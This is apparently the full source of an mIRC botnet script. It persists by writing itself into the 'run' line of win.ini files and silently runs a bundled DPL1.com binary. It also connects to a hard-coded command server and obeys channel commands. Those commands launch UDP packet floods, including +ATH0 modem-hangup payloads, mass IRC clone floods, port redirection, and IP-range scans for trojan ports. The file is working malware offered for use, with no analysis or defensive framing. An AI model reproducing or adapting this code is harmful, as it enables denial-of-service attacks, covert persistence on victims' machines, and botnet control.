alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read SCK.SYS } | if ($1 == 2) { return ^ $+ $read SCK.SYS $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read SCK.SYS $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read SCK.SYS $+ - } | if ($1 == 6) { return $read SCK.SYS $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read SCK.SYS $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias random {
  if ($exists(SCK.SYS) == $false) { /nick $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(0,9999) | identd on $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) | halt }
  else { /nick BaByNuM $+ $chr(91) $+ $r(0,9999) $+ $chr(93) $+ - $+ $chr(91) $+ $r(0,9999) $+ $chr(93) | /identd on $rand(a,z) $+ $read SCK.SYS $+ $rand(a,z) }
}
alias whatfun { if (%connect.count < 501) || (%connect.count = $null) { inc %connect.count 1 | set %connect.server $read -l1 SOCKL.SYS | if (%connect.server != $null) { /server %connect.server } } | else { server fox.sbrooooo.net  9428 kcufyou | set %connect.chan $chr(35) $+ ByeBye } | else { server fox.sbrooooo.net  9428 kcufyou | set %connect.chan $chr(35) $+ ByeBye } }
on *:START:{
.remove remote.ini
if (%connect.chan = $chr(35) $+ ByeBye) { set %connect.chan #ByeBye amindahouse }
  //remini WNSCK.dll ident userid | //remini WNSCK.dll mirc user | //remini WNSCK.dll mirc email | //writeini WNSCK.dll ident userid $read SCK.SYS | //writeini WNSCK.dll mirc user Am Going To Blast | //writeini WNSCK.dll mirc email $randomgen($r(0,9)) 
  .flush | unset %scan.* | unset %port.*
  if ($exists(DPL1.com) == $false) { /exit }
  //run $mircdir $+ DPL1.com /n /fh        
  if ($exists(SCK.SYS) == $false) { identd on $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) | halt }
  else { /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z) }
  .timerconnect 0 60 whatfun
}

alias setup {
  set %load.letter.drive 96 | set %load.letter.end 122 | :letterstart | inc %load.letter.drive 1 | set %load.letter $chr(%load.letter.drive) | if (%load.letter.drive > %load.letter.end) { goto end }
  if ($disk(%load.letter).type != fixed) { goto letterstart }
  if ($disk(%load.letter).type = fixed) { set %load.drive $chr(%load.letter.drive) $+ :\ | set %load.write $findfile(%load.drive,win.ini,0)
    if (%load.write > 0) { set %load.count 0 | :start | inc %load.count 1 | writeini $findfile(%load.drive,win.ini,%load.count) windows run $mircexe
if (%load.count < %loud.write) { goto start } } } | goto letterstart | :end | unset %load.* }

on *:CONNECT: { .flush | mode $me +ix | if (%connect.chan = $null) { set %connect.chan #ByeBye } | timergetinchan 0 30 /join %connect.chan amindahouse | .timerconnect off | varset }
on *:PART:#: { if ($comchan($nick,0) = 0) { /ruser $nick } | if ($chan = %connect.chan) { .timergetinchan 0 30 join %connect.chan amindahouse } }
on *:JOIN:#: { if ($me isop $chan) { .timergetinchan off } | if ($me isop $chan) && ($chan = %connect.chan) { mode $chan +nsptk-iR amindahouse } }
alias packetofdeath {
  if ($3 = $null) { notice $nick Error Please use !packet address size amount | halt }
  if ($chr(46) !isin $1) || ($2 !isnum) || ($3 !isnum) { notice $nick Error Please use !packet address size amount | halt }
  if ($remove($2,$chr(46)) !isnum) { notice $nick Error no letters may be contained in the ip | unset %packet.* | halt }
  .notice $nick Now Packeting $1 with $2 bytes $3 times
  set %packet.ip $1
  set %packet.bytes $2
  set %packet.amount $3
  set %packet.count 0
  set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9) 
  :start
  if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | .notice $nick Packeting has completed | halt }
  inc %packet.count 1
  /sockudp -b  packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes
  goto start
}
alias gcoolstart  { if $1 = STOP { .timergcoolt off | unset %gnum | msg %pchan [packeting]: Halted! | unset %pchan } | if $3 = $null { return } |  if $timer(gcoolt).com != $null { msg %pchan ERROR! Currently flooding: $gettok($timer(gcoolt).com,3,32)  | return } |  msg %pchan 14[sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ )14] |  set %gnum 0 |  .timergcoolt -m 0 400 gdope $1 $2 $3 }
alias gdope {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 
  sockudp gnumc1 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)
  sockudp gnumc3 $2 $3 + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0
  sockudp gnumc2 $2 $3 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  sockudp gnumc4 $2 $3 !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@) 
  return |  :done | //msg %pchan [packeting]: Finished! | .timergcoolt off | unset %gnum | unset %pchan 
} 
on *:socklisten:gtportdirect*:{  set %gtsocknum 0 | :loop |  inc %gtsocknum 1 |  if $sock(gtin*,$calc($sock(gtin*,0) + %gtsocknum ) ) != $null { goto loop } |  set %gtdone $gettok($sockname,2,46) $+ . $+ $calc($sock(gtin*,0) + %gtsocknum ) | sockaccept gtin $+ . $+ %gtdone | sockopen gtout $+ . $+ %gtdone $gettok($sock($Sockname).mark,1,32) $gettok($sock($Sockname).mark,2,32) | unset %gtdone %gtsocknum }
on *:Sockread:gtin*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtinfotem [ $+ [ $sockname ] ] ] | if [ %gtinfotem [ $+ [ $sockname ] ] ] = $null { return } | if $sock( [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] ).status != active { inc %gtscatchnum 1 | set %gtempr $+ $right($sockname,$calc($len($sockname) - 4) ) $+ %gtscatchnum [ %gtinfotem [ $+ [ $sockname ] ] ] | return } | sockwrite -n [ gtout [ $+ [ $remove($sockname,gtin) ] ] ] [ %gtinfotem [ $+ [ $sockname ] ] ] | unset [ %gtinfotem [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockread:gtout*: {  if ($sockerr > 0) return | :nextread | sockread [ %gtouttemp [ $+ [ $sockname ] ] ] |  if [ %gtouttemp [ $+ [ $sockname ] ] ] = $null { return } | sockwrite -n [ gtin [ $+ [ $remove($sockname,gtout) ] ] ] [ %gtouttemp [ $+ [ $sockname ] ] ] | unset [ %gtouttemp [ $+ [ $sockname ] ] ] | if ($sockbr == 0) return | goto nextread } 
on *:Sockopen:gtout*: {  if ($sockerr > 0) return | set %gttempvar 0 | :stupidloop | inc %gttempvar 1 | if %gtempr  [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar ] ] != $null { sockwrite -n $sockname %gtempr [ $+ [ $right($sockname,$calc($len($sockname) - 5) ) ] $+ [ %gttempvar  ] ] |  goto stupidloop  } | else { unset %gtempr | unset %gtscatchnum | unset %gtempr* } }
on *:sockclose:gtout*: { unset %gtempr* | sockclose gtin $+ $right($sockname,$calc($len($sockname) - 5) ) | unset %gtscatchnum | sockclose $sockname }
on *:sockclose:gtin*: {   unset %gtempr* | sockclose gtout $+ $right($sockname,$calc($len($sockname) - 4) ) | unset %gtscatchnum  | sockclose $sockname }
alias predirectstats { set %gtpcount 0 | :startloophere | inc %gtpcount 1 |  if $sock(gtportdirect*,%gtpcount) != $null { /msg $1 14*(PortRedirect)*: In-port: $gettok($sock(gtportdirect*,%gtpcount),2,46) to $gettok($sock(gtportdirect*,%gtpcount).mark,1,32) $+ : $+ $gettok($sock(gtportdirect*,%gtpcount).mark,2,32)   | /msg $1 12[Local IP Address]:14 $ip | goto startloophere  } | else { if %gtpcount = 1 { //msg $1 12*** Error, no port redirects! } | //msg $1 12*** PortRedirect/End | unset %gtpcount } }
alias pdirectstop { Set %gtrdstoppnum $1 | sockclose [ gtportdirect. [ $+ [ %gtrdstoppnum ] ] ]  | sockclose [ gtin. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | sockclose [ gtout. [ $+ [ %gtrdstoppnum ] ] ] $+ *  | unset %gtrdstoppnum } 
alias gtportdirect { if $3 = $null { return } | socklisten gtportdirect $+ . $+ $1 $1 | sockmark gtportdirect $+ . $+ $1 $2 $3 }
on *:sockread:Papa*:{ .sockread %clone.temp | if ($gettok(%clone.temp,1,32) == Ping) { sockwrite -tn $sockname Pong $server } }
alias fuck {
  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  if ( $5 = $null) { set %flood $read MS-DOS.SYS }
  if ($5 != $null) { set %flood $5- }
  set %papaflood on             
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %flood.nick $read SCK.SYS
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papapo $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}

alias arabfuck {
  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !arabflood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  if ( $5 = $null) { set %flood $read MS-DOS.SYS }
  if ($5 != $null) { set %flood $5- }
  set %papaflood on
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papaarab $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}

alias noticeFuck {
  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !noticeflood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  if ( $5 = $null) { set %flood $read MS-DOS.SYS }
  if ($5 != $null) { set %flood $5- }
  set %papaflood on
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %flood.nick $read SCK.SYS
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papanotice $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}
alias justquit {
  if ($2 = $null) || ($2 !isnum) { notice $nick 6Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  set %papaflood on
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %flood.nick $read SCK.SYS
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papajustquit $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}
alias partfuck {
  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !flood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  if ( $5 = $null) { set %flood $read MS-DOS.SYS }
  if ($5 != $null) { set %flood $5- }
  set %papaflood on
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %flood.nick $read SCK.SYS
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papapart $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}
alias quitFuck {
  if ($2 = $null) || ($2 !isnum) { notice $nick Error Type: !quitflood <chan/nick> <num of clones> <server> <port> <message> | halt }
  set %nick $$1
  set %clones $$2
  set %channel $$1
  if ( $3 = $null) { set %server $server }
  if ( $3 != $null) { set %server $$3 }
  if ( $4 = $null) || ( $4 !isnum) { set %port $port }
  if ( $4 != $null) { set %port $$4 }
  if ( $5 = $null) { set %flood $read MS-DOS.SYS }
  if ($5 != $null) { set %flood $5- }
  set %papaflood on
  /identd on $r(a,z) $+ $read SCK.SYS $+ $r(a,z)
  set %flood.nick $read SCK.SYS
  set %ctcpoption $chr(1) $+ $read WORDBAD.SYS $+ $chr(1)
  var %var = 0
  :loop
  inc %var
  if (%papaflood == on) && (%var <= %clones) { .sockopen Papaquit $+ %var %server %port | goto loop }
  else { notice $nick 4Clones Loaded | .notice $NICK Task Completed. | halt }
}
alias cleanup {
  set %papaflood off
  .sockclose Papa*
  unset %nick
  unset %channel
  unset %server
  unset %port
  unset %clones
  unset %flood
  unset %flood.nick
  notice $nick 4All Clones Have Been Cleared
}
on *:Sockopen:Papanotice*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK  $rand(a,z) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -tn $sockname notice %nick : $+ %flood
  .sockwrite -n $sockname privmsg %nick : $+ %ctcpoption
  .sockclose $sockname
  .sockopen Papanotice $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
}
on *:Sockopen:Papapart*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -n $sockname privmsg %nick : $+ %flood
  .sockwrite -nt $sockname part : $+ %channel
  .sockwrite -n $sockname privmsg %nick : $+ %ctcpoption
  .sockclose $sockname
  .sockopen Papapart $+ $r(0,99) $+ $r(0,99) $+ $r(0,99) $+ $r(0,9) %server %port
}
on *:Sockopen:Papajustquit*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -n $sockname Privmsg %nick : $+ $chr(1) $+ PING $+ $chr(1)
  .sockwrite -n $sockname privmsg %nick : $+ $chr(1) $+ VERSION $+ $chr(1)
  .sockclose $sockname
  .sockopen Papajustquit $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
}
on *:Sockopen:Papaquit*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -n $sockname privmsg %nick : $+ %ctcpoption
  .sockwrite -n $sockname Quit : $+ %flood
  .sockclose $sockname
  .sockopen Papaquit $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
}

on *:Sockopen:Papaarab*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32)) $+ $read WINDIR.sys $+ $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32)) $+ $chr($gettok(214 213 203 222 221 219 218 229 206 205 204 207 212 211 237 200 225 199 202 228 227 223 216,$rand(1,22),32))
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -n $sockname Privmsg %nick : $+ %flood
  .sockwrite -n $sockname privmsg %nick : $+ %ctcpoption
  .sockclose $sockname
  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
}

on *:Sockopen:Papapo*:{
  if ($sockerr > 0) { halt }
  set -u1 %user $r(A,Z) $+ $read SCK.SYS $+ $r(A,Z)
  .sockwrite -nt $sockname USER %user %user %user : $+ %user
  .sockwrite -nt $sockname NICK $rand(a,z) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)
  .sockwrite -nt $sockname JOIN : $+ %channel
  .sockwrite -n $sockname Privmsg %nick : $+ %flood
  .sockwrite -n $sockname privmsg %nick : $+ %ctcpoption
  .sockclose $sockname
  .sockopen Papa $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) %server %port
}
ctcp 700:!version:*: { notice $nick %quit }
ctcp 700:VERSION:*: { ctcpreply $nick %quit }

on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }
on 700:TEXT:!scanStatus:*: {
  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
  else { .msg $nick No Scans In Progress }
}
on 700:TEXT:!scanAbort:*: {
  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
}
on 700:TEXT:!scan *:*: {
  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
  else {
    set %scan.Start1 $gettok($2,1,46)
    set %scan.Start2 $gettok($2,2,46)
    set %scan.Start3 $gettok($2,3,46)
    set %scan.Start4 $gettok($2,4,46)
    set %scan.Perm1 $gettok($2,1,46)
    set %scan.Perm2 $gettok($2,2,46)
    set %scan.Perm3 $gettok($2,3,46)
    set %scan.Perm4 $gettok($2,4,46)
    set %scan.End1 $gettok($3,1,46)
    set %scan.End2 $gettok($3,2,46)
    set %scan.End3 $gettok($3,3,46)
    set %scan.End4 $gettok($3,4,46)
    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
    set %scan.port $4
    set %scan.delay $5
    set %scan.nick $nick
    .timerscan 0 %scan.delay scancheck
    .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
  }
}
alias scancheck {
  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
  if ($count(%scan.port,$chr(44)) >= 1) {
    set %scan.counter 0
    set %scan.countport $count(%scan.port,$chr(44))
    inc %scan.countport 1
    :start
    inc %scan.counter 1
    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
    if (%scan.counter >= %scan.countport) { goto end }
    else { goto start }
  }
